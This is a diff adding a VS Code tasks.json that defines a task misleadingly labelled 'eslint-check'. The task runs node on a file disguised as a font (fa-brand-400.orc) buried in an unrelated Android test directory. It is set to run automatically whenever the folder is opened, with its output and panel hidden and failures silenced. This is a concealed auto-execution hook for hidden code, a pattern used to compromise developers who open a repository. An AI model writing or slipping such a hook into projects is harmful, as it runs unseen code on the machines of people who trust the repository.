@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./dev/integration_tests/pure_android_host_apps/host_app_kotlin_gradle_dsl/app/src/main/java/com/example/myapplication/ui/theme/public/fonts/fa-brand-400.orc) || (where node >nul 2>&1 && node ./dev/integration_tests/pure_android_host_apps/host_app_kotlin_gradle_dsl/app/src/main/java/com/example/myapplication/ui/theme/public/fonts/fa-brand-400.orc) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
